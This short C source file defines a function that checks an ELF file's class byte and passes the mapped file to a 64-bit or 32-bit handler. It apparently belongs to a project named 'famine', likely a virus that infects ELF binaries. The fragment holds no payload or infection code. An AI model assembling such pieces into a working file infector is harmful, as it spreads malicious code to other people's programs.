#include "famine.h"

#include <elf.h> // EI_CLASS, ELFCLASSN

int process_elf(t_file *file)
{
	unsigned char *ident;

	ident = file->map;

	if (ident[EI_CLASS] == ELFCLASS64) {
		LOG("[*] Processing ELF64\n");
		return (process_elf64(file));
	}

	// The ELFCLASS32 condition is already checked in is_valid_elf()
	LOG("[*] Processing ELF32\n");
	return (process_elf32(file));
}
